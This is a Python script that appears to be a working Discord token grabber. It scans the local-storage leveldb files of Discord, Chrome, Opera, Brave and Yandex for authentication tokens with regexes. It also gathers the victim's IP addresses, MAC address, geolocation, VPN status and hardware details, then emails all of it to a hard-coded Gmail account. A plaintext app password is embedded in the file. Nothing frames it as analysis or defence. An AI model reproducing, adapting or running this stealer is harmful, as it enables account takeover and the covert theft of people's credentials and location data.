import psutil
import platform
import json
from datetime import datetime
from time import sleep
import requests
import socket
import os
import re
from uuid import getnode as get_mac
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Your Gmail credentials
GMAIL_USER = "ysflnt1@gmail.com"
GMAIL_APP_PASSWORD = "ncwb npus wsem maxw"  # Put your Gmail app password here

# Recipient email (can be same as sender)
RECIPIENT_EMAIL = "ysflnt1@gmail.com"

def scale(bytes, suffix="B"):
    defined = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < defined:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= defined

uname = platform.uname()
bt = datetime.fromtimestamp(psutil.boot_time())
host = socket.gethostname()
localip = socket.gethostbyname(host)

try:
    publicip = requests.get('https://api.ipify.org').text
except Exception:
    publicip = "Unavailable"

def get_ipapi_info(ip, field):
    try:
        return requests.get(f'https://ipapi.co/{ip}/{field}').text
    except Exception:
        return "Unavailable"

city = get_ipapi_info(publicip, 'city')
region = get_ipapi_info(publicip, 'region')
postal = get_ipapi_info(publicip, 'postal')
timezone = get_ipapi_info(publicip, 'timezone')
currency = get_ipapi_info(publicip, 'currency')
country = get_ipapi_info(publicip, 'country_name')
callcode = get_ipapi_info(publicip, 'country_calling_code')

try:
    vpn_resp = requests.get('http://ip-api.com/json?fields=proxy')
    proxy = vpn_resp.json().get('proxy', "Unavailable")
except Exception:
    proxy = "Unavailable"

mac = get_mac()

roaming = os.getenv('APPDATA')

# Discord & browser directories to search tokens
Directories = {
    'Discord': roaming + '\\Discord',
    'Discord Two': roaming + '\\discord',
    'Discord Canary': roaming + '\\Discordcanary',
    'Discord Canary Two': roaming + '\\discordcanary',
    'Discord PTB': roaming + '\\discordptb',
    'Google Chrome': roaming + '\\Google\\Chrome\\User Data\\Default',
    'Opera': roaming + '\\Opera Software\\Opera Stable',
    'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default',
}

def Yoink(Directory):
    Directory += '\\Local Storage\\leveldb'
    Tokens = []
    if not os.path.exists(Directory):
        return Tokens
    for FileName in os.listdir(Directory):
        if not FileName.endswith('.log') and not FileName.endswith('.ldb'):
            continue
        try:
            with open(f'{Directory}\\{FileName}', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        Tokens.extend(re.findall(regex, line))
        except:
            continue
    return Tokens

# Collect tokens from directories
all_tokens = []
for name, path in Directories.items():
    if os.path.exists(path):
        tokens = Yoink(path)
        all_tokens.extend(tokens)

# Gather system info
cpufreq = psutil.cpu_freq()
svmem = psutil.virtual_memory()
disk_io = psutil.disk_io_counters()
net_io = psutil.net_io_counters()

try:
    partitions = psutil.disk_partitions()
    partition_usage = None
    for partition in partitions:
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
            break  # just take the first usable partition for info
        except PermissionError:
            continue
except:
    partition_usage = None

# Compose collected info string
collected_info = f"""
Host: {host}
Local IP: {localip}
Public IP: {publicip}
MAC: {mac}
VPN Proxy: {proxy}

Location:
Country: {country}
Region: {region}
City: {city}
Postal Code: {postal}
Timezone: {timezone}
Currency: {currency}
Calling Code: {callcode}

System:
System: {uname.system}
Node Name: {uname.node}
Release: {uname.release}
Version: {uname.version}
Machine: {uname.machine}
Processor: {uname.processor}
Boot Time: {bt}

CPU:
Physical cores: {psutil.cpu_count(logical=False)}
Total cores: {psutil.cpu_count(logical=True)}
Max Frequency: {cpufreq.max:.2f}Mhz
Min Frequency: {cpufreq.min:.2f}Mhz
Current Frequency: {cpufreq.current:.2f}Mhz
CPU Usage: {psutil.cpu_percent()}%

Memory:
Total: {scale(svmem.total)}
Available: {scale(svmem.available)}
Used: {scale(svmem.used)}
Percentage: {svmem.percent}%

Disk:
""" + (f"Total Size: {scale(partition_usage.total)}\nUsed: {scale(partition_usage.used)}\nFree: {scale(partition_usage.free)}\nPercentage: {partition_usage.percent}%" if partition_usage else "No disk usage info") + f"""

Disk I/O:
Read bytes: {scale(disk_io.read_bytes)}
Write bytes: {scale(disk_io.write_bytes)}

Network:
Bytes Sent: {scale(net_io.bytes_sent)}
Bytes Received: {scale(net_io.bytes_recv)}

Discord Tokens found:
{', '.join(all_tokens) if all_tokens else "No tokens found"}
"""

def send_email(subject, body):
    msg = MIMEMultipart()
    msg['From'] = GMAIL_USER
    msg['To'] = RECIPIENT_EMAIL
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(GMAIL_USER, GMAIL_APP_PASSWORD)
        server.send_message(msg)
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print("Failed to send email:", e)

# Send the email with the collected info
send_email("Collected System Info and Tokens", collected_info)
